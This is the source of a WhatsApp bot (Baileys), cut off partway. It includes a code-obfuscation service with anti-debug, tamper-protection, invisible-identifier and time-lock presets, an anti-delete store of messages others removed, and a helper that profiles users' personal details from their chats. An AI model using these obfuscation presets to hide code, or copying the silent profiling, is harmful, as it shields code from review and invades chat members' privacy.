require('./setting/config');
const {
  default: makeWASocket,
  useMultiFileAuthState,
  useSingleFileAuthState,
  makeInMemoryStore,
  initInMemoryKeyStore,
  downloadContentFromMessage,
  downloadAndSaveMediaMessage,
  downloadMediaMessage,
  generateWAMessage,
  generateWAMessageContent,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  relayWAMessage,
  getContentType,
  getStream,
  jidDecode,
  encodeWAMessage,
  encodeSignedDeviceIdentity,
  areJidsSameUser,
  isBaileys,
  processTime,
  mentionedJid,
  WA_DEFAULT_EPHEMERAL,
  WA_MESSAGE_STATUS_TYPE,
  WA_MESSAGE_STUB_TYPES,
  Browsers,
  Browser,
  DisconnectReason,
  ReconnectMode,
  Presence,
  GroupSettingChange,
  ProxyAgent,
  URL_REGEX,
  MediaType,
  MediaConnInfo,
  MediaPathMap,
  Mimetype,
  MimetypeMap,
  MessageType,
  MessageOptions,
  MessageTypeProto,
  WAMessageStatus,
  WAFlag,
  WAMetric,
  WANode,
  ChatModification,
  WAContextInfo,
  WAUrlInfo,
  WAProto,
  WAGroupMetadata,
  GroupMetadata,
  AuthenticationState,
  MiscMessageGenerationOptions,
  AnyMessageContent,
  WAMediaUpload,
  WALocationMessage,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  WAMessageProto,
  templateMessage,
  InteractiveMessage,
  Header,
  BaileysError,
  BufferJSON,
  waChatKey,
  fetchLatestBaileysVersion,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,
  proto, 
  makeCacheableSignalKeyStore
} = require("@whiskeysockets/baileys");

const fs = require('fs')
const path = require('path')
const qrcode = require("qrcode-terminal");
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios');
const fsx = require('fs-extra')
const crypto = require('crypto')
let JsConfuser;
try { JsConfuser = require('js-confuser'); } catch (e) { console.error('⚠️ Module js-confuser belum terinstall! Jalankan: npm install js-confuser'); }

const { Worker } = require('worker_threads');

// Obfuscate worker source is inlined (not a separate file) so it doesn't
// tergantung struktur folder eksternal. Dijalankan via eval:true.
const OBFUSCATE_WORKER_SOURCE = `'use strict';
// ================================================================
// OBFUSCATE WORKER — menjalankan JsConfuser di thread terpisah
// supaya event loop utama (koneksi WhatsApp) tidak terblokir
// saat memproses file besar / config berat (controlFlowFlattening, dll).
// All configs are IDENTICAL to those in case.js — unchanged.
// ================================================================
const { parentPort, workerData } = require('worker_threads');
let JsConfuser;
try { JsConfuser = require('js-confuser'); } catch (e) {
    parentPort.postMessage({ error: 'js-confuser belum terinstall di server' });
    process.exit(0);
}

async function safeObfuscate(code, config) {
    let cfg = { ...config };
    for (let attempt = 0; attempt < 20; attempt++) {
        try {
            return await JsConfuser.obfuscate(code, cfg);
        } catch (e) {
            const match = /Invalid option:\\s*'([^']+)'/.exec(e.message || '');
            if (match && Object.prototype.hasOwnProperty.call(cfg, match[1])) {
                delete cfg[match[1]];
                continue;
            }
            throw e;
        }
    }
    throw new Error('Too many invalid options in obfuscation config');
}

// ── Konfigurasi (identik dengan case.js, JANGAN diubah) ──
function getBaseConfig() {
    return {
        target: "node", compact: true, renameVariables: true, renameGlobals: true,
        stringEncoding: true, stringSplitting: true, stringCompression: true,
        controlFlowFlattening: 0.85, flatten: true, shuffle: true,
        duplicateLiteralsRemoval: true, deadCode: true, calculator: true,
        dispatcher: true, globalConcealing: true, opaquePredicates: true,
        lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
    };
}
function getStrongObfuscationConfig() {
    return {
        target: "node", compact: true, renameVariables: true, renameGlobals: true,
        identifierGenerator: "randomized", stringEncoding: true, stringSplitting: true,
        stringCompression: true, controlFlowFlattening: 0.95, flatten: true, shuffle: true,
        duplicateLiteralsRemoval: true, deadCode: true, calculator: true,
        dispatcher: true, globalConcealing: true, opaquePredicates: true,
        lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
    };
}
function getBigObfuscationConfig() {
    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    const generateBigName = () => {
        const length = Math.floor(Math.random() * 5) + 5;
        let name = "";
        for (let i = 0; i < length; i++) name += chars[Math.floor(Math.random() * chars.length)];
        return name;
    };
    return {
        target: "node", compact: true, renameVariables: true, renameGlobals: true,
        identifierGenerator: generateBigName, stringEncoding: true, stringSplitting: true,
        controlFlowFlattening: 0.85, shuffle: true, globalConcealing: true,
        duplicateLiteralsRemoval: true, deadCode: true, opaquePredicates: true,
        lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
    };
}
function getInvisibleObfuscationConfig() {
    return {
        target: "node", calculator: true, compact: true, hexadecimalNumbers: true,
        controlFlowFlattening: 0.75, deadCode: 0.2, dispatcher: true,
        duplicateLiteralsRemoval: 0.75, flatten: true, globalConcealing: true,
        identifierGenerator: "zeroWidth", minify: true, movedDeclarations: true,
        objectExtraction: true, opaquePredicates: 0.75, renameVariables: true,
        renameGlobals: true, stringConcealing: true, stringCompression: true,
        stringEncoding: true, stringSplitting: 0.75, rgf: false,
    };
}
function getVarObfuscationConfig() {
    return {
        target: "node", compact: true, renameVariables: true, renameGlobals: true,
        stringEncoding: true, stringCompression: true, controlFlowFlattening: 0.8,
        globalConcealing: true, deadCode: true,
        identifierGenerator: () => {
            const vars = ["var", "let", "const", "func", "obj", "arr"];
            const base = vars[Math.floor(Math.random() * vars.length)];
            return \`\${base}\${Math.random().toString(36).substring(2, 6)}\`;
        },
        lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
    };
}
function getCustomObfuscationConfig(customName) {
    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    const generateCustomName = () => {
        let suffix = "";
        for (let i = 0; i < Math.floor(Math.random() * 3) + 2; i++)
            suffix += chars[Math.floor(Math.random() * chars.length)];
        return \`\${customName}_\${suffix}\`;
    };
    return {
        target: "node", compact: true, renameVariables: true, renameGlobals: true,
        identifierGenerator: generateCustomName, stringEncoding: true, stringSplitting: true,
        controlFlowFlattening: 0.75, shuffle: true, duplicateLiteralsRemoval: true,
        deadCode: true, opaquePredicates: true,
        lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
    };
}
function getNebulaObfuscationConfig() {
    const generateNebulaName = () => {
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        let r = "";
        for (let i = 0; i < 4; i++) r += chars[Math.floor(Math.random() * chars.length)];
        return \`NX\${r}\`;
    };
    return {
        target: "node", compact: true, renameVariables: true, renameGlobals: true,
        identifierGenerator: generateNebulaName, stringCompression: true,
        stringConcealing: false, stringEncoding: true, stringSplitting: false,
        controlFlowFlattening: 0.75, flatten: true, shuffle: true, rgf: true,
        deadCode: true, opaquePredicates: true, dispatcher: true,
        globalConcealing: true, objectExtraction: true, duplicateLiteralsRemoval: true,
        lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
    };
}
function getNovaObfuscationConfig() {
    return {
        target: "node", calculator: false, compact: true, controlFlowFlattening: 1,
        deadCode: 1, dispatcher: true, es5: true, duplicateLiteralsRemoval: 1,
        flatten: true, globalConcealing: true, hexadecimalNumbers: 1,
        identifierGenerator: () => "var_" + Math.random().toString(36).substring(7),
        lock: { antiDebug: true, integrity: true, selfDefending: true },
        minify: true, movedDeclarations: true, objectExtraction: true,
        opaquePredicates: true, renameGlobals: true, renameVariables: true,
        shuffle: true, stack: true, stringCompression: true, stringConcealing: true,
    };
}
function getMandarinObfuscationConfig() {
    const mandarinChars = ["龙","虎","风","云","山","河","天","地","雷","电","火","水","木","金","土","星","月","日","光","影","峰","泉","林","海","雪","霜","雾","冰","焰","石"];
    return {
        target: "node", compact: true, renameVariables: true, renameGlobals: true,
        identifierGenerator: () => { let n=""; for(let i=0;i<Math.floor(Math.random()*4)+3;i++) n+=mandarinChars[Math.floor(Math.random()*mandarinChars.length)]; return n; },
        stringEncoding: true, stringSplitting: true, stringConcealing: true,
        stringCompression: true, controlFlowFlattening: 1, flatten: true,
        shuffle: true, duplicateLiteralsRemoval: true, deadCode: true, calculator: true,
        opaquePredicates: true, objectExtraction: true, movedDeclarations: true,
        rgf: true, hexadecimalNumbers: true, dispatcher: true, globalConcealing: true,
        lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
    };
}
function getArabObfuscationConfig() {
    const arabicChars = ["أ","ب","ت","ث","ج","ح","خ","د","ذ","ر","ز","س","ش","ص","ض","ط","ظ","ع","غ","ف","ق","ك","ل","م","ن","ه","و","ي"];
    return {
        target: "node", compact: true, renameVariables: true, renameGlobals: true,
        identifierGenerator: () => { let n=""; for(let i=0;i<Math.floor(Math.random()*4)+3;i++) n+=arabicChars[Math.floor(Math.random()*arabicChars.length)]; return n; },
        stringEncoding: true, stringSplitting: true, stringConcealing: true,
        stringCompression: true, controlFlowFlattening: 1, flatten: true,
        shuffle: true, duplicateLiteralsRemoval: true, deadCode: true, calculator: true,
        opaquePredicates: true, objectExtraction: true, movedDeclarations: true,
        rgf: true, hexadecimalNumbers: true, dispatcher: true, globalConcealing: true,
        lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
    };
}
function getJapanObfuscationConfig() {
    const japaneseChars = ["あ","い","う","え","お","か","き","く","け","こ","さ","し","す","せ","そ","た","ち","つ","て","と","な","に","ぬ","ね","の","は","ひ","ふ","へ","ほ","ま","み","む","め","も","や","ゆ","よ","ら","り","る","れ","ろ","わ","を","ん"];
    return {
        target: "node", compact: true, renameVariables: true, renameGlobals: true,
        identifierGenerator: () => { let n=""; for(let i=0;i<Math.floor(Math.random()*4)+3;i++) n+=japaneseChars[Math.floor(Math.random()*japaneseChars.length)]; return n; },
        stringEncoding: true, stringSplitting: true, controlFlowFlattening: 0.9,
        flatten: true, shuffle: true, duplicateLiteralsRemoval: true, deadCode: true,
        calculator: true, opaquePredicates: true,
        lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
    };
}
function getJapanxArabObfuscationConfig() {
    const mixed = ["あ","い","う","え","お","か","き","く","さ","し","す","た","ち","つ","な","に","ぬ","は","ひ","ふ","ま","み","む","や","ゆ","よ","ら","り","る","わ","を","ん","أ","ب","ت","ث","ج","ح","خ","د","ذ","ر","ز","س","ش","ص","ض","ط","ظ","ع","غ","ف","ق","ك","ل","م","ن","ه","و","ي"];
    return {
        target: "node", compact: true, renameVariables: true, renameGlobals: true,
        identifierGenerator: () => { let n=""; for(let i=0;i<Math.floor(Math.random()*4)+3;i++) n+=mixed[Math.floor(Math.random()*mixed.length)]; return n; },
        stringCompression: true, stringConcealing: true, stringEncoding: true,
        stringSplitting: true, controlFlowFlattening: 0.95, flatten: true, shuffle: true,
        rgf: false, dispatcher: true, duplicateLiteralsRemoval: true, deadCode: true,
        calculator: true, opaquePredicates: true,
        lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
    };
}
function getSiuCalcrickObfuscationConfig() {
const chars = "\x61\u0062\x63\u0064\x65\u0066\x67\u0068\x69\u006A\x6B\u006C\x6D\u006E\x6F\u0070\x71\u0072\x73\u0074\x75\u0076\x77\u0078\x79\u007A\x41\u0042\x43\u0044\x45\u0046\x47\u0048\x49\u004A\x4B\u004C\x4D\u004E\x4F\u0050\x51\u0052\x53\u0054\x55\u0056\x57\u0058\x59\u005A\x30\u0031\x32\u0033\x34\u0035\x36\u0037\x38\u0039";
    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: () => {
            let r = "";
            for (let i = 0; i < 6; i++) r += chars[Math.floor(Math.random() * chars.length)];
            return '气RajuX和Here无' + r;
        },
        stringCompression: true,
        stringEncoding: true,
        stringSplitting: true,
        stringConcealing: true,
        controlFlowFlattening: 1,
        shuffle: true,
        rgf: true,
        flatten: true,
        objectExtraction: true,
        movedDeclarations: true,
        duplicateLiteralsRemoval: true,
        deadCode: true,
        calculator: true,
        opaquePredicates: true,
        hexadecimalNumbers: true,
        dispatcher: true,
        globalConcealing: true,
        minify: true,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
}

async function obfuscateQuantum(fileContent) {
    const generateTimeBasedIdentifier = () => {
        const timeStamp = new Date().getTime().toString().slice(-5);
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_$#@&*";
        let id = "qV_";
        for (let i = 0; i < 7; i++)
            id += chars[Math.floor((parseInt(timeStamp[i % 5]) + i * 2) % chars.length)];
        return id;
    };
    const ms = new Date().getMilliseconds();
    const phantom = ms % 3 === 0 ? \`if(Math.random()>0.999)console.log('PhantomTrigger');\` : "";
    if (typeof fileContent !== 'string') fileContent = String(fileContent);
    const clean = fileContent.replace(/'/g, "\\\\'").replace(/\\n/g, "\\\\n").replace(/\\r/g, "\\\\r");
    const obfuscated = await safeObfuscate(clean + phantom, {
        target: "node", preset: "high", compact: true, renameVariables: true,
        renameGlobals: true, identifierGenerator: generateTimeBasedIdentifier,
        stringCompression: true, stringConcealing: false, stringEncoding: true,
        controlFlowFlattening: 0.9, flatten: true, shuffle: true, rgf: true,
        opaquePredicates: { count: 8, complexity: 5 }, dispatcher: true,
        globalConcealing: true,
        lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true },
        duplicateLiteralsRemoval: true,
    });
    let code = obfuscated.code || obfuscated;
    if (typeof code !== "string") throw new Error("Hasil obfuscation bukan string");
    const key = ms % 256;
    const escaped = code.replace(/'/g, "\\\\'").replace(/\\\\/g, "\\\\\\\\").replace(/\\n/g, "\\\\n").replace(/\\r/g, "\\\\r");
    return \`(function(){var k=\${key};return function(c){return c.split('').map(function(x,i){return String.fromCharCode(x.charCodeAt(0)^(k+(i%16)));}).join('');}('\${escaped}');})();\`;
}
async function obfuscateTimeLocked(fileContent, days) {
    const expiry = new Date();
    expiry.setDate(expiry.getDate() + parseInt(days));
    const expiryTs = expiry.getTime();
    const wrapped = \`(function(){const expiry=\${expiryTs};if(new Date().getTime()>expiry){throw new Error('Script has expired after \${days} days');}\${fileContent}})();\`;
    const obfuscated = await safeObfuscate(wrapped, {
        target: "node", compact: true, renameVariables: true, renameGlobals: true,
        identifierGenerator: "randomized", stringCompression: true, stringConcealing: true,
        stringEncoding: true, controlFlowFlattening: 0.75, flatten: true, shuffle: true,
        rgf: false, opaquePredicates: { count: 6, complexity: 4 }, dispatcher: true,
        globalConcealing: true,
        lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true },
        duplicateLiteralsRemoval: true
    });
    let code = obfuscated.code || obfuscated;
    if (typeof code !== "string") throw new Error("Hasil obfuscation bukan string");
    return code;
}

const CONFIG_MAP = {
    encjs: getBaseConfig,
    strong: getStrongObfuscationConfig,
    bigstro: getBigObfuscationConfig,
    invis: getInvisibleObfuscationConfig,
    norinv: getInvisibleObfuscationConfig,
    varenc: getVarObfuscationConfig,
    yuienc: getNebulaObfuscationConfig,
    nova: getNovaObfuscationConfig,
    japan: getJapanObfuscationConfig,
    japxar: getJapanxArabObfuscationConfig,
    siucal: getSiuCalcrickObfuscationConfig,
    chinaenc: getMandarinObfuscationConfig,
    arabenc: getArabObfuscationConfig,
};

(async () => {
    try {
        const { methodName, fileContent, customName, days } = workerData;
        let result;

        if (methodName === 'quantum') {
            result = await obfuscateQuantum(fileContent);
        } else if (methodName === 'timelocked') {
            result = await obfuscateTimeLocked(fileContent, days);
        } else if (methodName.startsWith('custom_')) {
            const out = await safeObfuscate(fileContent, getCustomObfuscationConfig(customName));
            result = out.code || out;
        } else if (CONFIG_MAP[methodName]) {
            const cfg = CONFIG_MAP[methodName]();
            const out = await safeObfuscate(fileContent, cfg);
            result = out.code || out;
        } else {
            throw new Error(\`Unknown method: \${methodName}\`);
        }

        if (typeof result !== 'string') throw new Error('Hasil obfuscation bukan string');
        parentPort.postMessage({ result });
    } catch (err) {
        parentPort.postMessage({ error: err.message });
    }
})();
`;

// Jalankan obfuscation di thread terpisah supaya event loop utama
// (koneksi WhatsApp) tidak terblokir saat config berat (controlFlowFlattening tinggi, dll)
// -> mencegah disconnect/Bad MAC akibat event loop macet lama.
function runObfuscateWorker(workerData, timeoutMs = 5 * 60 * 1000) {
    return new Promise((resolve, reject) => {
        const worker = new Worker(OBFUSCATE_WORKER_SOURCE, { eval: true, workerData });
        const timer = setTimeout(() => {
            worker.terminate();
            reject(new Error('Timeout: proses obfuscation terlalu lama'));
        }, timeoutMs);

        worker.once('message', (msg) => {
            clearTimeout(timer);
            if (msg.error) reject(new Error(msg.error));
            else resolve(msg.result);
            worker.terminate();
        });
        worker.once('error', (err) => {
            clearTimeout(timer);
            reject(err);
            worker.terminate();
        });
    });
}

// Safe wrapper: if the installed js-confuser version doesn't support
// suatu opsi config ("Invalid option: 'xxx'"), opsi tersebut otomatis
// dihapus dan obfuscate dicoba ulang — tanpa mengubah niat config aslinya.
async function safeObfuscate(code, config) {
    let cfg = { ...config };
    for (let attempt = 0; attempt < 20; attempt++) {
        try {
            return await JsConfuser.obfuscate(code, cfg);
        } catch (e) {
            const match = /Invalid option:\s*'([^']+)'/.exec(e.message || '');
            if (match && Object.prototype.hasOwnProperty.call(cfg, match[1])) {
                console.log(`⚠️ [JsConfuser] Option '${match[1]}' is not supported in this version, skipping.`);
                delete cfg[match[1]];
                continue;
            }
            throw e;
        }
    }
    throw new Error('Too many invalid options in obfuscation config');
}
const { Boom } = require("@hapi/boom");
const googleTTS = require('google-tts-api')
const ffmpeg = require('fluent-ffmpeg')
const speed = require('performance-now')
const { spawn: spawn, spawnSync, exec } = require('child_process');
const timestampp = speed();
const jimp = require("jimp")
const latensi = speed() - timestampp
const moment = require('moment-timezone')
const yts = require('yt-search');
const ytdl = require('ytdl-core');
const FormData = require('form-data');
const fetch = (...args) => import('node-fetch').then(m => m.default(...args));
const { Sticker, StickerTypes } = require('wa-sticker-formatter');
const channelReact = require('./allfunc/channel-react.js');
const toJid = s => (!s ? '' : s.includes('@newsletter') ? s : `${s}@newsletter`);
const shortJid = j => j.replace('@newsletter', '');
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, generateProfilePicture } = require('./allfunc/storage')
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid, addExif } = require('./allfunc/exif.js')
let richpic;
try { richpic = fs.readFileSync('./media/image1.jpg'); } catch { richpic = null; }
const numberEmojis = ["1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣"];
_ownerCache = null;
    _premiumCache = null;
    _sudoCache = null;
// ============ CREATE REQUIRED DIRECTORIES ============
const requiredDirs = [
    './database',
    './database/pairing',
    './database/sessions',
    './tmp',
    './media'
];

requiredDirs.forEach(dir => {
    if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
        console.log(`📁 Created directory: ${dir}`);
    }
});
// ====================================================
const getGroupAdmins = (participants) => {
    let admins = [];
    for (let i of participants) {
        if (i.admin === "admin" || i.admin === "superadmin") {
            admins.push(i.id);
        }
    }
    return admins;
};

//AUTO DELETE
// ================================================================
// REPLACE THIS ENTIRE BLOCK IN case.js
// Mulai dari baris ~139 (//AUTO DELETE) sampai fungsi-fungsi
// helper + ketiga event listener di bawahnya
// ================================================================

// ============================================================
// BAGIAN 1 — GANTI BLOK //AUTO DELETE (~baris 139)
// ============================================================

//AUTO DELETE
const ANTIDELETE_SESSION_FILE = './raju_del/raju_delete_sesi.json';

// Buat folder otomatis kalau belum ada
if (!fs.existsSync('./raju_del')) {
    fs.mkdirSync('./raju_del', { recursive: true });
}

if (!global.antidelete)   global.antidelete   = {};
if (!global.adStats)      global.adStats       = { recovered: 0, ignored: 0 };

// Pakai Map — lebih efisien dari object biasa
global.msgUpsertStore = global.msgUpsertStore instanceof Map
    ? global.msgUpsertStore
    : new Map();

// Dedup notifikasi anti-delete (1 pesan = 1 notif, walau terdeteksi di banyak event)
global.notifiedDeletes = global.notifiedDeletes instanceof Set
    ? global.notifiedDeletes
    : new Set();

function markAndCheckDeleteNotified(jid, msgId) {
    const key = `${jid}_${msgId}`;
    if (global.notifiedDeletes.has(key)) return true; // sudah dinotif
    global.notifiedDeletes.add(key);
    if (global.notifiedDeletes.size > 3000) {
        const first = global.notifiedDeletes.values().next().value;
        global.notifiedDeletes.delete(first);
    }
    return false;
}

// ── File helpers ──────────────────────────────────────────────
function ensureDirs() {
    const dir = path.dirname(ANTIDELETE_SESSION_FILE);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
}

function atomicWrite(filePath, data) {
    ensureDirs();
    const tmp = filePath + '.tmp';
    fs.writeFileSync(tmp, JSON.stringify(data, null, 2), 'utf-8');
    fs.renameSync(tmp, filePath);
}

function loadDeleteSession() {
    ensureDirs();
    try {
        if (!fs.existsSync(ANTIDELETE_SESSION_FILE)) {
            atomicWrite(ANTIDELETE_SESSION_FILE, []);
            return [];
        }
        const raw  = fs.readFileSync(ANTIDELETE_SESSION_FILE, 'utf-8');
        const data = JSON.parse(raw);
        if (!Array.isArray(data)) {
            console.warn('[AntiDelete] Invalid format, resetting to []');
            atomicWrite(ANTIDELETE_SESSION_FILE, []);
            return [];
        }
        return data;
    } catch (e) {
        console.error('[AntiDelete] Failed to load session:', e.message);
        // Backup file rusak
        try {
            const bak = ANTIDELETE_SESSION_FILE + '.corrupted.' + Date.now();
            if (fs.existsSync(ANTIDELETE_SESSION_FILE)) fs.copyFileSync(ANTIDELETE_SESSION_FILE, bak);
            atomicWrite(ANTIDELETE_SESSION_FILE, []);
        } catch {}
        return [];
    }
}

function saveDeleteSession(data) {
    try {
        if (!Array.isArray(data)) return;
        atomicWrite(ANTIDELETE_SESSION_FILE, data);
    } catch (e) {
        console.error('[AntiDelete] Failed to save session:', e.message);
    }
}

// ── Restore state saat bot start ─────────────────────────────
;(function restoreAntiDeleteState() {
    try {
        const db = loadDeleteSession();
        let count = 0;
        for (const session of db) {
            if (session?.Aktif === 'yes' && session?.sesi) {
                global.antidelete[session.sesi] = true;
                count++;
            }
        }
        console.log(`[AntiDelete] ✓ State restored — ${count} sesi aktif`);
    } catch (e) {
        console.error('[AntiDelete] Failed to restore state:', e.message);
    }
})();



//SYSTEM AI
// ==================== RAJU AI GLOBAL CONFIGURATIONS ====================
const RAJU_OWNER_JID = '13252318920@s.whatsapp.net'; // Owner WhatsApp JID format
const RAJU_API_BASE = 'https://apikey-bot-by.darksecret.cloud';
const RAJU_DATA_DIR = path.join(__dirname, 'raju_data');
const RAJU_MEMORY_DIR = path.join(RAJU_DATA_DIR, 'memory');
const RAJU_SESSION_FILE = path.join(RAJU_DATA_DIR, 'sessionsai.json');
const RAJU_PY_HELPER = path.join(RAJU_DATA_DIR, 'raju_helper.py');

if (!fs.existsSync(RAJU_DATA_DIR)) fs.mkdirSync(RAJU_DATA_DIR, { recursive: true });
if (!fs.existsSync(RAJU_MEMORY_DIR)) fs.mkdirSync(RAJU_MEMORY_DIR, { recursive: true });
if (!fs.existsSync(RAJU_SESSION_FILE)) fs.writeFileSync(RAJU_SESSION_FILE, '{}');

// Python helper structure customized to match English patterns & labels
const RAJU_PY_CODE = `
import sys, json, os, re, datetime, unicodedata

MAX_FACTS       = 100
MAX_TOPICS      = 100
TOP_TOPICS_SAVE = 50
TOP_TOPICS_SHOW = 15
MAX_HISTORY     = 30

STOPWORDS = {
    'yang','dengan','untuk','sudah','tidak','adalah','akan','dari','pada','dalam',
    'bisa','juga','saya','kamu','dia','mereka','this','that','what','when','where',
    'have','been','will','kami','kita','anda','atau','jika','maka','oleh','itu',
    'ini','ada','apa','siapa','kapan','bagaimana','kenapa','karena','tapi','namun',
    'dan','ke','di','ya','lah','deh','dong','nih','sih','kah','pun','punya','mau',
    'udah','lagi','bisa','harus','jadi','kalau','gimana','emang','banget','sangat',
}

FACT_PATTERNS = [
    (r'(?:nama\\s*(?:saya|aku|gue|gw|ku)|saya\\s*(?:bernama|dipanggil)|aku\\s*(?:bernama|dipanggil)|panggil\\s*(?:saya|aku|gue)\\s*(?:saja|aja)?)\\s*[:\\-]?\\s*([A-Za-z\\u00C0-\\u024F][A-Za-z\\u00C0-\\u024F\\s]{1,28})', 'nama'),
    (r'(?:umur|usia)\\s*(?:saya|aku|gue|gw)?\\s*(?:adalah|itu|sekarang)?\\s*(\\d{1,3})\\s*(?:tahun|thn|th)?', 'umur'),
    (r'(?:lahir|ultah|ulang\\s*tahun)\\s*(?:saya|aku)?\\s*(?:tanggal|tgl)?\\s*(\\d{1,2}[\\s/\\-]\\w+[\\s/\\-]?\\d{0,4})', 'ulang_tahun'),
    (r'(?:saya|aku|gue|gw)\\s+(?:tinggal|berdomisili|berada|menetap|stay)\\s+(?:di\\s+)?([A-Za-z\\u00C0-\\u024F][A-Za-z\\u00C0-\\u024F\\s,]{1,50})', 'lokasi'),
    (r'(?:asal|dari)\\s+(?:kota|daerah|desa)?\\s*([A-Za-z\\u00C0-\\u024F][A-Za-z\\u00C0-\\u024F\\s]{1,40})', 'asal'),
    (r'(?:hobi|kesukaan|kegemaran|senang|suka)\\s*(?:saya|aku|gue)?\\s*(?:adalah|itu|nya)?\\s*[:\\-]?\\s*([A-Za-z\\u00C0-\\u024F][A-Za-z\\u00C0-\\u024F\\s,dan]{2,80})', 'hobi'),
    (r'(?:pekerjaan|kerjaan|profesi|jabatan)\\s*(?:saya|aku|gue)?\\s*(?:adalah|sebagai|jadi|itu)?\\s*[:\\-]?\\s*([A-Za-z\\u00C0-\\u024F][A-Za-z\\u00C0-\\u024F\\s]{2,50})', 'pekerjaan'),
    (r'(?:saya|aku|gue|gw)\\s+(?:kerja|bekerja|berprofesi)\\s+(?:sebagai|jadi|di)\\s+([A-Za-z\\u00C0-\\u024F][A-Za-z\\u00C0-\\u024F\\s]{2,50})', 'pekerjaan'),
    (r'(?:sekolah|kuliah|study|belajar)\\s+(?:di|di\\s+)?([A-Za-z\\u00C0-\\u024F][A-Za-z\\u00C0-\\u024F\\s]{2,60})', 'pendidikan'),
    (r'(?:jurusan|prodi|program\\s*studi)\\s*(?:saya|aku)?\\s*(?:adalah|itu)?\\s*[:\\-]?\\s*([A-Za-z\\u00C0-\\u024F][A-Za-z\\u00C0-\\u024F\\s]{2,60})', 'jurusan'),
    (r'(?:saya|aku|gue|gw)\\s+(?:adalah|seorang|merupakan)\\s+([A-Za-z\\u00C0-\\u024F][A-Za-z\\u00C0-\\u024F\\s]{2,40})', 'identitas'),
    (r'(?:makanan|minuman)\\s*(?:favorit|kesukaan)?\\s*(?:saya|aku)?\\s*(?:adalah|itu)?\\s*[:\\-]?\\s*([A-Za-z\\u00C0-\\u024F][A-Za-z\\u00C0-\\u024F\\s,]{2,50})', 'favorit_makanan'),
    (r'warna\\s*(?:favorit|kesukaan)?\\s*(?:saya|aku)?\\s*(?:adalah|itu)?\\s*[:\\-]?\\s*([A-Za-z\\u00C0-\\u024F][A-Za-z\\u00C0-\\u024F\\s]{2,30})', 'favorit_warna'),
    (r'(?:saya|aku|gue)\\s+(introvert|extrovert|ambivert|pemalu|pendiam|aktif|kreatif)', 'kepribadian'),
    (r'(?:saya|aku|gue)\\s+(?:sedang|lagi)\\s+(stress|depresi|bahagia|senang|sedih|bingung|galau|excited|semangat)', 'kondisi_emosi'),
]

FACT_LABELS = {
    'nama':           'Name',
    'umur':           'Age',
    'ulang_tahun':    'Birthday',
    'lokasi':         'Location',
    'asal':           'Origin',
    'hobi':           'Hobby',
    'pekerjaan':      'Occupation',
    'pendidikan':     'Education',
    'jurusan':        'Major',
    'identitas':      'Identity',
    'favorit_makanan':'Favorite Food',
    'favorit_warna':  'Favorite Color',
    'kepribadian':    'Personality',
    'kondisi_emosi':  'Emotional State',
}

def normalize(text):
    nfkd = unicodedata.normalize('NFKD', text)
    return ''.join(c for c in nfkd if not unicodedata.combining(c)).lower()

def clean_value(raw):
    val = raw.strip().rstrip('.,!?;:)')
    val = re.sub(r'\\s+', ' ', val)
    return val.title()

def load_mem(mem_path):
    default = {
        'username':   '',
        'facts':      [],
        'chat_count': 0,
        'topics':     {},
        'history':    [],
        'created_at': datetime.datetime.utcnow().isoformat(),
        'last_active': None,
    }
    if os.path.exists(mem_path):
        try:
            with open(mem_path, 'r', encoding='utf-8') as f:
                data = json.load(f)
                for k, v in default.items():
                    data.setdefault(k, v)
                return data
        except Exception:
            pass
    return default

def save_mem(mem_path, mem):
    tmp = mem_path + '.tmp'
    with open(tmp, 'w', encoding='utf-8') as f:
        json.dump(mem, f, ensure_ascii=False, indent=2)
    os.replace(tmp, mem_path)

def extract_facts(text):
    facts = []
    low = normalize(text)
    now = datetime.datetime.utcnow().isoformat()
    for pat, label in FACT_PATTERNS:
        for m in re.finditer(pat, low):
            raw = m.group(1)
            val = clean_value(raw)
            if len(val) > 1 and len(val) < 120:
                facts.append({'label': label, 'value': val, 'raw': raw.strip(), 'date': now})
    return facts

def merge_facts(existing_facts, new_facts):
    merged  = {f['label']: f for f in existing_facts}
    added   = 0
    updated = 0
    for nf in new_facts:
        lbl = nf['label']
        if lbl not in merged:
            merged[lbl] = nf
            added += 1
        elif normalize(merged[lbl]['value']) != normalize(nf['value']):
            nf['previous'] = merged[lbl]['value']
            merged[lbl] = nf
            updated += 1
    out = list(merged.values())[-MAX_FACTS:]
    return out, added, updated

def update_topics(topics, text):
    words = re.findall(r'\\b[a-zA-Z\\u00C0-\\u024F]{4,}\\b', normalize(text))
    for w in words:
        if w not in STOPWORDS and not w.isdigit():
            topics[w] = topics.get(w, 0) + 1
